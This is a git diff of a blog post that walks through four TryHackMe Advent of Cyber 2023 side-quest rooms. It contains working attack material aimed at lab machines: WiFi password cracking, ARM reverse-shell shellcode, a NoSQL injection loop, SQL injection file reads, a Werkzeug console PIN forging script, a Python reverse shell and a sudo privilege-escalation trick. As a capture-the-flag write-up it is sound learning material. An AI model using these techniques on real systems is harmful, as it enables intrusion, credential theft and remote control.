@@ -9,83 +9,91 @@ tags:
   - wireshark
   - bof
   - containers
-draft: true
+draft: false
 ---
-The TryHackMe platform organized the Advent Of Cyber ​​2023 event, which was a set of basic cybersecurity challenges. In parallel, it organized four events of a higher difficulty, which were hidden within the main event. 
-This is the first cybersecurity event in which I have participated, so it is with great enthusiasm that I leave you the route that I followed to solve each test.
 
+The TryHackMe platform organized the Advent Of Cyber ​​2023 event, which was a set of basic cybersecurity challenges. In parallel, it organized four events of a higher difficulty, which were hidden within the main event. 
+This is the first cybersecurity competition in which I have participated, so it is with great enthusiasm that I leave you the route that I followed to solve each test.
+
+- [Advent Of Cyber 2023 – TryHackMe](https://tryhackme.com/room/adventofcyber2023)
+- [Advent of Cyber '23 Side Quest](https://tryhackme.com/room/adventofcyber23sidequest)
+	- [[#SQ1 The Return of the Yeti]]
+	- [[#SQ2 Snowy ARMageddon]]
+	- [[#SQ3 Frosteau Busy with Vim]]
+	- [[#SQ4 The Bandit Surfer]]
 
 # SQ1: The Return of the Yeti
-https://tryhackme.com/room/adv3nt0fdbopsjcap
 
-## Room discovery
+## Gueting the QR – Room discovery
+
+ROOM: https://tryhackme.com/room/adv3nt0fdbopsjcap
+
 The link to this room was hidden on TryHackMe's social networks, and to enter you had to look for the four images corresponding to the four fragments of the QR code.
 
 ## Package analysis
 This wasn't a machine but a `.pcapng` file (a network packet capture) that we have to analyze with wireshark in order to answer five questions.
 
 ##### **Question 1**: *What's the name of the WiFi network in the PCAP?*
-This question is easy. Download `VanSpy.pcapng.zip`, extract it and open it with `wireshark`, just by reading you will find it is **FreeWifiBFC**, but you can also apply the filter `wlan.ssid`
+This question is easy. Download `VanSpy.pcapng.zip`, extract it and open it with wireshark, just by reading you will find it is **FreeWifiBFC**, but you can also apply the filter `wlan.ssid`
 
 ##### **Question 2**: *What's the password to access the WiFi network?* 
-This can be solved using `aircrack` (if the password is weak, which it is), but you will need an extra step:
+This can be solved using `aircrack-ng` (if the password is weak, which it is), but you will need an extra step:
 1. Convert `.pcapng` to `.pcap`: `tshark -F pcap -r VanSpy.pcapng -w VanSpy.pcap`
-2. Crack it! `aircrack-ng VanSpy.pcap -w /root/SecLists/rockyou.txt` (password: `Christmas`)
+2. Crack it! `aircrack-ng VanSpy.pcap -w /root/SecLists/rockyou.txt` (password: **Christmas**)
 
 ##### **Question 3**: *What suspicious tool is used by the attacker to extract a juicy file from the server?*
 With the decrypted 802.11 traffic you can search for tcp packets. On wireshark, go to `Edit > Preferences > Protocols > IEEE 802.11`.
-![decrypted 802.11 traffic with wireshark](_assets/aoc23_wireshark1.png)
+![[assets/aoc23-sidequests/wireshark1.png | decrypted 802.11 traffic with wireshark ]]
 
 If you follow TCP Stream, the last that the attacker did was connecting to a windows machine, and using `mimikatz` to extract a `.pfx` file with the `rsa` key, which you will need to decrypt the TLS traffic.
-![mimikatz wireshark](_assets/aoc23_wireshark2%20-%20mimikatz.png)
+![[assets/aoc23-sidequests/wireshark2 - mimikatz.png | mimikatz wireshark]]
 
 ##### **Question 4**: *What is the case number assigned by the CyberPolice to the issues reported by McSkidy?*: `31337-0`
 1. Decode the pfx file copied from wireshark: `cat certificate-base64.pfx | base64 -d > certificate.pfx`
 2. Extract it with the right password (clue: don't need to bruteforce it, since it was extracted with `mimikatz` that's the default password): `openssl pkcs12 -in certificate.pfx -out keyfile.key -nodes`
-  - In case you would like to try bruteforce, in another situation, tou can use `pfx2john` to create a hash.
+	  - In case you would like to try bruteforce, in another situation, tou can use `pfx2john` to create a hash.
 3. Edit the key and import it to wireshark > preferences > rsa to decrypt the tls traffic. What you are looking for is text that has been copied through RDP clipboard. Wireshark captures that traffic as protocol *CLIPRDR*, if you filter by `rdp_cliprdr` and try to read those packets you will find it. The "Decrypted TLS" looks like that: `...3.1.3.3.7.-.0...`
-  - Also some people did use `pyrdp`\*
+	
+	\* Also some people did use `pyrdp` to convert the rdp session to a mp4 file, which it's a more elegant way of doing it:
+	1. Load the rsa key to decrypt the tls traffic
+	2. Export the rdp session
+	3. Convert the capture into a video
+	```bash
+	pip install pyrdp-mitm[full]
+	pyrdp-convert -o . -f mp4 sq1-rdp.pcap
+	```
 
 ##### **Question 5**, *What is the content of the yetikey1.txt file?*
 This question can be answered by simply reading the decrypted TLS traffic as before (notice that on wireshark you were reading an extra `.` between characters), and you will recognize which is it because previously you will read `yetikey1.txt`.
 `1-1f9548f131522e85ea30e801dfd9b1a4e526003f9e83301faad85e6154ef2834`
 
-\* Additionaly, some people did use [`pyrdp`]() to convert the rdp session to a mp4 file, which it's a more elegant way of doing it:
-1. Load the rsa key to decrypt the tls traffic
-2. Export the rdp session
-```bash
-pip install pyrdp-mitm[full]
-pyrdp-convert -o . -f mp4 sq1-rdp.pcap
-```
-
 
 ---
 # SQ2: Snowy ARMageddon
-https://tryhackme.com/room/armageddon2r
 
-The second room is a Linux machine cataloged as "insane".
-First we will gain access to the room through a QR code that we will obtain by exploiting a simple buffer overflow in a pixel game. Secondly we will use a payload written in python and arm assembly for creating a reverse shell. Finally we will do a NOSQL injection for getting the credentials form MongoDB.
+The second room was my favourite one. It is a Linux machine cataloged as "insane", where first we will gain access to the room through a QR code that we will obtain by exploiting a simple buffer overflow in a pixel game. Secondly we will use a payload written in python and ARM assembly for creating a reverse shell. Finally we will do a NOSQL injection locally for getting the credentials form MongoDB.
 
+## Getting the QR: Pixel Game - Memory Corruption
 
-## Pixel Game - Memory Corruption
+ROOM: https://tryhackme.com/room/armageddon2r
 
-The URL for the room was hidden in the task from the **day 6** from the [main event of Advent Of Cyber](https://tryhackme.com/room/adventofcyber2023).
+The URL for the room was hidden in the task of the **day 6** of the main event.
 It was a pixel game where you have to exploit a simple buffer overflow.
 
 It is a game in which the main character can interact with a computer to obtain up to 16 coins, which he can use to change his name or buy items in a store.
 We can see how the game memory is distributed, where 12 bytes are designated to store the name variable. However, if we enter a longer name, the additional bytes go to occupy the next variable, which in this case are the game coins.
 
-![[_assets/aoc23_game_memory.png| Game Memory |300]]
+![[assets/aoc23-sidequests/game_memory.png| Game Memory |300]]
 
 We also can buy items on the shop, but we notice there's a missing one corresponding to letter `a`, and if we try to buy it, the shopper tell us that we don't have enough coins.
 
 We can try to get a large amount of coins by modifying the memory of the game. For doing so we can use the ASCII to hex table, and also a decimal to hex [online converter](https://www.rapidtables.com/convert/number/hex-to-decimal.html) .
 
-![[_assets/aoc23_ASCII_table.png|400]]
+![[assets/aoc23-sidequests/ASCII_table.png|400]]
 
 As we can see in the table, the symbol `~` corresponds to the maximum hexadecimal value that we can type, so we enter 12 random characters for the name and 4 additional bytes that will overwrite the value of coins on the memory. By entering the name `aaaabbbbcccc~~~~` we get `2122219134` coins.
 
-![[_assets/aoc23_memory_corruption_1.gif| Memory Corruption (1) |400]]
+![[assets/aoc23-sidequests/memory_corruption_1.gif| Memory Corruption (1) |400]]
 
 Now we can successfully buy the item "a", which is a token of Yeti, and suddenly a "spirit" called G.O.C.P appears:
 > *According to the legend, a **cat named Snowball** will arrive at this place one day. He will meet **Midas the greedy merchant**, and **Ted the name switcher**. He'll bring **exactly 31337 coins** and the **token of the Yeti**. When all these conditions are met, input the **30 lives secret code** and what's hidden shall be revealed.*
@@ -119,9 +127,8 @@ Notice how the game adds a NULL character (`∅`) after your bytes, and it reall
    
 The [Konami Code](https://en.wikipedia.org/wiki/Konami_Code), also commonly referred to as the Contra Code and sometimes the **30 Lives code**: `↑↑↓↓←→←→BA`
 
-![[_assets/aoc23_memory_corruption_2.gif| Memory Corruption (2)|400]]
+![[assets/aoc23-sidequests/memory_corruption_2.gif| Memory Corruption (2)|400]]
 
----
 
 ## ARM Camera - Assembly
 
@@ -132,7 +139,7 @@ We start scanning all ports from the machine with `nmap`:
 nmap -Pn -n -sS --min-rate=5000 -p- $IP -oN allPorts -vv
 ```
 
-```txt file:"" {1}
+```
 PORT      STATE SERVICE
 22/tcp    open  ssh
 23/tcp    open  telnet
@@ -149,7 +156,7 @@ nmap -Pn -n -sS --min-rate=5000 -sCV -p 22,23,8080,50628 $IP -oN targetPorts -vv
 
 At port 50628 there is a web app, which emulates an ARM camera.
 
-![[_assets/aoc23_camera_50628.png| Camera at port 50628 |350]]
+![[assets/aoc23-sidequests/camera_50628.png| Camera at port 50628 |350]]
 
 A deep search on the [internet](https://armx.exploitlab.net/docs/debugging-with-armx.html) reveals it is part of the [EMUX (formerly ARMX) Firmware Emulation Framework](https://armx.exploitlab.net/). The source code of the docker container can be found on [GitHub](https://github.com/therealsaumil/armx).
 
@@ -315,10 +322,10 @@ SC += b'\xc0\x10\x81\xe2'
 SC += b'\x04\x10\x2d\xe5'
 ```
 
-We only need to change the IP address from the exploit to our THM IP, in my case `10.9.129.243` which is `0a.09.81.f3` in hexadecimal.
+We only need to change the IP address from the exploit to our THM IP, in my case `10.9.129.213` which is `0a.09.81.d5` in hexadecimal.
 
 ```python
-SC += b'\xf3\x10\xa0\xe3'    # mov r1, #243
+SC += b'\xd5\x10\xa0\xe3'    # mov r1, #213
 SC += b'\x01\x14\xa0\xe1'    # lsl r1, #8
 SC += b'\x81\x10\x81\xe2'    # add r1, #129
 SC += b'\x01\x14\xa0\xe1'    # lsl r1, #8
@@ -344,10 +351,11 @@ The `Optcode` that is written on the python exploit can be obtained using an [[h
 
 ###### \[Optional \]: Locally compiling assembly
 I would like to know how to do the assembly part without the online tool, so I created a docker container and runned the following commands:
+
 ```bash file:"arm compilation"
 # 1) Install the compiler
 apt update && apt install -y gcc-arm-none-eabi
-# 2) The file we want to assemble
+# 2) Create the file we want to assemble
 cat << EOF > ip.s
 mov r1, #0x164        // 59 1F A0 E3
 lsl r1, r1, #8        // 01 14 A0 E1
@@ -406,6 +414,7 @@ with open(sys.argv[1], 'r') as f:
 ```
 
 ---
+
 Inside the machine, as we already knew, we are not in a real arm camera system but inside a container which is emulating this (`/.emux`). We can find some credentials: 
 ```sh
 $ cat /.emux/.nfs00000000000fb07f00000001
@@ -425,62 +434,138 @@ $ grep -i pass . -r
 Now if we go back to the website at `$IP:50628` we can log in with username=`admin` and password=`Y3tiStarCur!ouspassword=admin`.
 **Flag 1**: `THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}`
 We still need to find the yetikey2.
+
 ### Enabling telnet connection (optional)
 Once you are in the camera, run `telnetd` and in another shell connect to telnet `telnet $IP 23` with credentials `root:Y3tiStarCur!ous&`
 
-### Accessing port 8080 **locally**
-Because *"Access is strictly forbidden for non-elves"*
-
-```bash
-curl -u user:pass IP:PORT
-curl -u 'admin:Y3tiStarCur!ouspassword=admin' 10.10.26.166:8080
+### Escaping the container
+The container has a limited version of BusyBox, and many commands are missing
+```sh
+# chroot 
+chroot: applet not found
+```
+We can download the [[https://www.busybox.net/downloads/binaries/1.21.1/busybox-armv7l | busybox-armv7l]] and upload it to the remote machine bu creating a python http server:
+```sh
+python -m http.server 8000
+curl -O http://$THM_IP:8000/busybox-armv7l
+chmod +x busybox-armv7l
+./busybox-armv7l chroot /proc/1/root
 ```
 
 ## MongoDB - NoSQLi
 ### Port 8080
 
-There's a login form at `http://$IP:8080/login.php/` (notice the final slash `/`)
-- `/.DS_Store` hints it's a NOSQL database
-- Review NoSQLi: [THM - NoSQL injection Basics](https://tryhackme.com/room/nosqlinjectiontutorial)
-- NoSQL enumeration: https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
-      
-	```shell file:"NOSQL users enumeration"
-	python3 nosqli-user-pass-enum.py -u http://$IP:8080/login.php/ -up username -pp password -ep username -op login:login,submit:submit -m POST
-	
-	7 username(s) found:
-	Blizzardson
-	Frostbite
-	Grinchowski
-	Iciclevich
-	Northpolinsky
-	Scroogestein
-	Tinselova
-	```
-      
-	```shell file:"NOSQL passwords enumeration"
-	python3 nosqli-user-pass-enum.py -u http://$IP:8080/login.php/ -up username -pp password -ep password -op login:login,submit:submit -m POST
-	
-	6Ne2HYXUovEIVOEQg2US
-	7yIcnHu8HC6QCH1MCfHS
-	advEpXUBKt3bZjk3aHLR
-	h1y6zpVTOwGYoB95aRnk
-	jlXUuZKIeCONQQIe92GZ
-	rCwBuLJPNzmRGExQucTC
-	tANd8qZ93sFHUBrJhdQj
-	uwx395sm4GpVfqQ4dUDI
-	E33v0lTuUVa1ct4sSed1
-	F6Ymdyzx9C1QeNOcU7FD
-	HoHoHacked
-	JZwpMOTmDvVYDq3uSb3t
-	NlJt6HBZBG3olEphq8gr
-	ROpPXouppjXNf2pmmT0Q
-	UZbIt6L41BmLeQJF0gAR
-	WmLP5OZDiLos16Ie1owB
-	```
+> [!notice] Machine Changes
+> During the AoC it was possible to access to the login form at `http://$IP:8080/login.php/` (notice the final slash `/`) and through a NOSQLi attack I was able to enumerate the usernames and passwords from the MongoDB
+> - Enumerating the website, `/.DS_Store` hints it's a NOSQL database
+> - Review NoSQLi: [THM - NoSQL injection Basics](https://tryhackme.com/room/nosqlinjectiontutorial)
+> But now this has been patched since the intended path was to access this website locally through the camera.
+> Before I used a python script for enumerating users and passwords, which can be found on [GitHub](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration).
+
+### Accessing port 8080 **locally**
+Because *"Access is strictly forbidden for non-elves"*
+![[assets/aoc23-sidequests/forbidden.png| 400]]
+
+We will be using `cURL` from the shell we obtained with the camera.
+```sh
+$ curl -s $IP:8080
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>401 Unauthorized</title>
+</head><body>
+<h1>Unauthorized</h1>
+<p>This server could not verify that you
+are authorized to access the document
+requested.  Either you supplied the wrong
+credentials (e.g., bad password), or your
+browser doesn't understand how to supply
+the credentials required.</p>
+<hr>
+<address>Apache/2.4.57 (Debian) Server at 10.10.60.141 Port 8080</address>
+</body></html>
+```
+
+We can try to provide the credentials we've find using `curl -u user:pass IP:PORT` (I am also using `-s` for don't printing the status)
+```sh
+curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' $IP:8080
+<SNIP>
+<b>Warning</b>:  Undefined array key "user" in <b>/var/www/html/index.php</b> on line <b>19</b><br />
+<SNIP>
+```
+With the `-I` flag we get the headers instead of the body of the response, and we will see that the website redirects to `/login.php`:
+
+```curl {6,10}
+curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' $IP:8080 -I
+HTTP/1.1 302 Found
+Date: Sat, 24 Feb 2024 13:52:52 GMT
+Server: Apache/2.4.57 (Debian)
+X-Powered-By: PHP/8.1.26
+Set-Cookie: PHPSESSID=9d5bfbb309dc45bee006b985cc1a28e0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /login.php
+Content-Type: text/html; charset=UTF-8
+```
+
+With the flag `-L` we will follow the redirections, and we will get to the login form which we where able to access previously from our browser.
+
+```sh
+curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' $IP:8080 -L -X POST -d 'username=admin&password=admin'
+
+curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' $IP:8080/login.php -L -X POST -d 'username[$regex]=.*&password[$regex]=.*' -c $COOKIE
+
+<h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frostbite!</h1>
+
+#NOSQLi using curl
+curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' $IP:8080/login.php -L -X POST -d 'username[$regex]=.*&password[$regex]=.*' -c $COOKIE | grep Welcome | cut -d" " -f18 | cut -d"!" -f1
+```
+
+
+```sh file:"NOSQLi enumeration (in sh)"
+#!/bin/sh
+IP=10.10.240.114
+COOKIE=890244e10c869fee9a26bd515ae9bd48
+
+users="Frostbite"
+while true; do
+    for user in $users; do
+        payload="$payload&username[%24nin][]=$user"
+    done
+    response=$(curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://$IP:8080/login.php -X POST -d "$payload&password[\$regex]=.*" -L -c $COOKIE | grep Welcome | cut -d" " -f18 | cut -d"!" -f1)
+    response_len=$(curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://$IP:8080/login.php -X POST -d "$payload&password[\$regex]=.*" -L -c $COOKIE | wc -c)
+    if [ -z $response ]; then break; fi
+    users="$users $response"
+    echo -e "$response \t $response_len"
+done
+```
+
+```sh
+curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' $IP:8080/login.php -L -X POST -d 'username=Frosteau&password[$regex]=.*' -c $COOKIE | grep -A 1 yetikey2
+                <li class="text-sm mt-3 font-medium ml-6">yetikey2.txt</li>
+                <li class="text-sm mt-3 font-medium ml-6">2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK</li>
+```
 
 ---
 # SQ3: Frosteau Busy with Vim
-https://tryhackme.com/jr/busyvimfrosteau
+
+## Getting the QR: restoring a windows screenshot
+
+ROOM: https://tryhackme.com/jr/busyvimfrosteau
+
+The QR code to Side Quest 3 can be found in the challenge of the **day 11** from the main event.
+At `C:\Users\Administrator\Desktop>` there's a directory called `chatlog_files` containing some images, one of them was an screenshot cropped.
+
+```bash
+git clone https://github.com/frankthetank-music/Acropalypse-Multi-Tool.git && cd Acropalypse-Multi-Tool
+python3 -m venv venv && source venv/bin/activate
+pip install -r requirements.txt
+python gui.py
+```
+
+The second screenshot will be useful as a reference because in order to use the tool you have to specify the dimensions of the original image.
+
+![[assets/aoc23-sidequests/sq3_qr_a.png| Acropalypse – restoring image tool]]
 
 ## Nmap
 
@@ -496,88 +581,207 @@ After running `nmap` we can get this information about the open ports:
 - 8085 (telnet) -> vim
 - 8095 (telnet) -> nano
 
-`telnet $IP 8065` is interesting because it doesn't give you a direct shell but you are inside the `vim` editor, which can be used to run commands, however, you can't get a direct shell with ~~`:!/bin/sh`~~.
+## Getting a shell
+
+`telnet $IP 8085` is interesting because it doesn't give you a direct shell but you are inside the `vim` editor, which can be used to run commands, however, you can't get a direct shell with ~~`:!/bin/sh`~~.
+
+1. `ftp $IP 8075` lets you to log in as `anonymous`. The directory where you have access is located at `/tmp/ftp`, and you can go there using vim (`telnet $IP 8085`) and typing `:e /tmp/ftp`.
+2. I am using Debian and the machine is running Ubuntu (based on Debian), so I uploaded `sh` from my local machine (you can also download it from [[pkgs.org]]). From ftp, I simply run `put /bin/sh sh`. With vim, I overwritted the `nano` binary with the uploaded `sh`, so the next time that we attempt to connect to port `8095` we will have a shell. You can do this by two different ways:
+	- a) Deleting all content of `/tmp/nano` and pasting the content of `/tmp/ftp/sh` (with vim, cut the whole file with <kbd>ggVGd</kbd> and paste with <kbd>P</kbd>)
+	- b) Moving `/tmp/ftp/sh` to `/tmp/nano` (with <kbd>R</kbd>) and giving to it executable permissions `:python3 import os; os.chmod("/tmp/nano", 0o777)`
+	![[assets/aoc23-sidequests/vim.gif| 400]]
+3. I created a folder `:python3 import os; os.makedirs("/tmp/bin")` to move some binaries there. With `:python3 import os; os.chmod("/tmp/sh", 0o777)`  I could make them executable. I was trying to escape from the container by running `chroot /proc/1/root`, but i was logged as `ubuntu` so I didn't have permissions for doing this. However, navigating through the system I found `/usr/frosty/sh`, which was an empty file. If you overwrite this with the `sh` that you uploaded (and again you give it executable permissions), you will be able to get a shell as user `frosty` from `telnet $IP 8065`.
+4. Once you have a shell, add to your path with `PATH=/tmp/bin:$PATH`. 
+
 ## Jailbreak 
 
-This is the procedure that I followed in order to get a shell:
+> [!link] Breaking chroot
+> Check [[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash | HackTricks – Escaping from Jails]] → use the tool [[https://github.com/earthquake/chw00t |chw00t]]
+
+On your machine, compile the program:
+
+```bash
+curl -O https://raw.githubusercontent.com/earthquake/chw00t/master/chw00t.c
+gcc chw00t.c -o chw00t
 ```
-# ftp (at /tmp/ftp)
+
+Upload it to `/tmp/bin` as the other binaries and give it executable permissions.
+If you check the documentation, you just need to use option *-3 Procfs magic*, which tries to mount procfs into a directory than crawls all the processes for a root or cwd entry. Root privileges inside the container are needed (since we have them as user `frosty` we can proceed).
+
+```sh
+chw00t -3 --dir /proc/1
+```
+
+![[assets/aoc23-sidequests/sq3_break_chroot.png| Breaking chroot with `chw00t` | 350]]
+
+
+## Overview
+Here's a brief command ***cheatsheet*** that I made while I was doing the machine, and I want to keep it here because it might be useful:
+
+``` file:"SQ3 cheatsheet"
+# ftp $IP 8075 (at /tmp/ftp)
 put localFilePath remoteFileName
-# with vim u rename it (move it)
-# new file
-:open("your_file_path_here", 'w').close()
-# new dir
-:python3 import os; os.makedirs("/tmp/bin")
-# chmod
-:python3 import os; os.chmod("/tmp/sh", 0o777)
-# add to path
-PATH=/tmp/bin:$PATH
-```
-
-1. `ftp $IP 8075` lets you to log in as `anonymous`. The directory where you have access is located at `/tmp/ftp`, and you can go there using vim (`telnet $IP 8065`) and typing `:e /tmp/ftp`.
-2. I am using Debian and the machine is running Ubuntu (based on Debian), so I uploaded `bash` from my local machine (you can also download it from [[pkgs.org]]). From ftp, I simply run `put /bin/bash bash` and then I tried to execute it with vim, but the uploaded binary didn't have execution permissions. The solution that I found was using python commands,
-```
-# at 8087
 put /usr/bin/chmod chmod
-# at 8085
+# vim -> telnet $IP 8085
+## go to a directory/file
 :e /tmp/ftp
-R
-Moving /tmp/ftp/chmod to : /tmp/bin/chmod
+## move/rename a file with vim by pressing `R`
+### move /tmp/ftp/chmod to : /tmp/bin/chmod
+## create directory
+:python3 import os; os.makedirs("/tmp/bin")
+## chmod 777 file
 :python3 import os; os.chmod("/tmp/bin/chmod", 0o777)
-# at 8065
+## then you can just run `chmod +x -R /tmp/bin`
+# sh -> telnet $IP 8065
+## add /tmp/bin to path
 PATH=/tmp/bin:$PATH
 ```
-
-`chw00t -3 --dir /proc/1`
 
 
 ---
-# [SQ4: ](https://tryhackme.com/room/surfingyetiiscomingtotown)
+# SQ4: The Bandit Surfer
 
-## Nmap 
+## Getting the QR: exploring Git
+
+ROOM: https://tryhackme.com/room/surfingyetiiscomingtotown
+
+The last QR was hidden on a GitLab repository in the challenge of the **day 21** from the main event, simply hidden on a deleted branch.
+
+## Nmap
+The following ports were open:
 - 22 (ssh)
 - 8000 (http)
 
-## Website at 8000
-directory scan (gobuster)
+### Website at 8000
+Directory scan (gobuster)
+```bash
+gobuster dir -u http://$IP:8000 -b 403,404 -w ~/SecLists/Discovery/Web-Content/common.txt -x php/,html/,txt/
+```
 - `/download`
 - `/console`
 
-### `/download`
-Says to click images to download 3 svg files.
-Burpsuite detects sqli at `http://$IP:8000/download?id=2'`
-```python
-# File "/home/mcskidy/app/app.py", line 28, in download
-    file_id = request.args.get('id','')
-    if file_id!='':
-        cur = mysql.connection.cursor()
-        query = "SELECT url FROM elves where url_id = '%s'" % (file_id)
-        cur.execute(query)
-        results = cur.fetchall()
-        for url in results:
-            filename = url[0]
-            response_buf = BytesIO()
+The website at http://$IP:8000 shows three images of elfs and a text that says to click those images to download the svg files. If you hover over any of them you will see that the URL has the parameter `id`, which can be vulnerable to SQLi.
+We can confirm this easily by replacing `id=1` for `id='`, and we get redirected to an error panel which corresponds to a python flask app. It is a *[[https://en.wikipedia.org/wiki/Web_Server_Gateway_Interface |WSGI application]] powered by the Werkzeug traceback interpreter*.
+
+### `/console` – Get a shell
+This seems a python interactive console, very useful to get into the machine, but is locked with a pin which can't be bruteforced because it seems to have a limit of attemps.
+
+## Werkzeug Console PIN Exploit
+
+There's a HackTricks post for this: [[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug |Werkzeug / Flask Debug]].
+By looking for *Werkzeug Console PIN Exploit* we find a [[https://github.com/grav3m1nd-byte/werkzeug-pin |github repo]]. The following variables need to be exploited to get the console PIN:
+```py
+probably_public_bits = [
+    username,
+    modname,
+    getattr(app, '__name__', getattr(app.__class__, '__name__')),
+    getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    str(uuid.getnode()),
+    get_machine_id(),
+]
+```
+- `username` is the user who started this Flask (Werkzeug)
+- `modname` is flask.app
+- `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` is Flask
+- `getattr(mod, '__file__', None)` is the absolute path of app.py in the flask directory
+- `uuid.getnode()` is the MAC address of the current computer, `str(uuid.getnode())` the decimal expression
+	```bash
+	printf "%d\n" "0x$(curl -s "http://$IP:8000/download?id=11'+UNION+SELECT+'file://///sys/class/net/eth0/address';--" | sed 's/://g')"
+	```
+- `get_machine_id()` read the value in `/etc/machine-id` or `/proc/sys/kernel/random/boot_id`
+	```bash
+	curl -s "http://$IP:8000/download?id=11'+UNION+SELECT+'file://///etc/machine-id';--"
+	```
+
+```py file:"werkzeug-pin-exploit.py"
+import hashlib
+from itertools import chain
+probably_public_bits = [
+	'mcskidy',# username
+	'flask.app',# modname
+	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+	'/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+	'3179522531357', # str(uuid.getnode()),  /sys/class/net/eth0/address
+	'aee6189caee449718070b58132f2e4ba' # get_machine_id(), /etc/machine-id
+]
+
+#h = hashlib.md5()
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+	if not bit:
+		continue
+	if isinstance(bit, str):
+		bit = bit.encode('utf-8')
+	h.update(bit)
+h.update(b'cookiesalt')
+#h.update(b'shittysalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+num = None
+if num is None:
+	h.update(b'pinsalt')
+	num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+	for group_size in 5, 4, 3:
+		if len(num) % group_size == 0:
+			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+						  for x in range(0, len(num), group_size))
+			break
+	else:
+		rv = num
+
+print(rv)
 ```
 
-So the query executed is `SELECT url FROM elves where url_id = '%s'`
+By running the previous script we will get the correct pin for the console:
 
-`http://$IP:8000/download?id=11'+UNION+SELECT+'file://///sys/class/net/eth0/address';--`
+```bash
+python3 werkzeug-pin-exploit.py
+953-030-483
+```
 
-`http://$IP:8000/download?id=11'+UNION+SELECT+'file://///etc/machine-id';--`
-
-
-get shell
+And from there, since we can execute python code, we can create a reverse shell:
 
 ```bash
 # host
-nc -lnv 10.9.129.243 4444
-# target
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.129.243",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+nc -lnv 10.9.129.213 4444
+# console
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.129.213",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
 ```
 
-```bash
-git show e9855c8a10cb97c287759f498c3314912b7f4713
+Additionally you can turn this shell into an interactive feature-rich shell:
+```bash file:"stable shell"
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl + z
+stty raw -echo; fg
+export columns=130
+```
 
+## Privilege Escalation
+We can look for some credentials. There is a git repository so we can try to look there.
+
+```bash
+cd /home/mcskidy/app
+
+git log
+<SNIP>
+commit e9855c8a10cb97c287759f498c3314912b7f4713
+Author: mcskidy <mcskidy@proddb>
+Date:   Thu Oct 19 20:01:41 2023 +0000
+    Changed MySQL user
+<SNIP>
+
+git show e9855c8a10cb97c287759f498c3314912b7f4713
  # MySQL configuration
  app.config['MYSQL_HOST'] = 'localhost'
 -app.config['MYSQL_USER'] = 'root'
@@ -587,7 +791,53 @@ git show e9855c8a10cb97c287759f498c3314912b7f4713
  app.config['MYSQL_DB'] = 'elfimages'
  mysql = MySQL(app)
 
+sudo -l  # mcskidy password -> F453TgvhALjZ
+User mcskidy may run the following commands on proddb:
+    (root) /usr/bin/bash /opt/check.sh
 ```
 
+We found MySQL credentials, but because passwords are reused we can execute `sudo`. User `mcskidy` can execute as sudo `/opt/check.sh`, so lets take a look at what it does:
 
-### `/console`
+```bash file :"/opt/check.sh"
+#!/bin/bash
+. /opt/.bashrc
+cd /home/mcskidy/
+
+WEBSITE_URL="http://127.0.0.1:8000"
+
+response=$(/usr/bin/curl -s -o /dev/null -w "%{http_code}" $WEBSITE_URL)
+
+# Check the HTTP response code
+if [ "$response" == "200" ]; then
+  /usr/bin/echo "Website is running: $WEBSITE_URL"
+else
+  /usr/bin/echo "Website is not running: $WEBSITE_URL"
+fi
+```
+
+It is also executing `/opt/.bashrc`, which is slightly different from the default `.bashrc` on the user's home directory
+
+```bash file:"diff /opt/.bashrc ~/.bashrc"
+diff ~/.bashrc /opt/.bashrc 
+4c4
+< 
+---
+> enable -n [ # ]
+```
+
+The previous command is read as `enable -n [` because the `#` comments the rest of the line. Checking `enable --help`, tells us that what this is doing is disable shell builtins for a binary called `[`. That was not very obvious for me but actually the privilege escalation consists on the fact that you will be able to run with sudo privileges any command written inside a file called `[`.
+
+```bash file:"["
+cat << EOF > [
+#!/bin/bash
+/bin/bash
+EOF
+chmod +x [
+sudo /usr/bin/bash /opt/check.sh
+```
+
+![[assets/aoc23-sidequests/sq4.png|500]]
+
+---
+
+I really enjoyed this event, and I hope that you also found this interesting, thanks for reading.
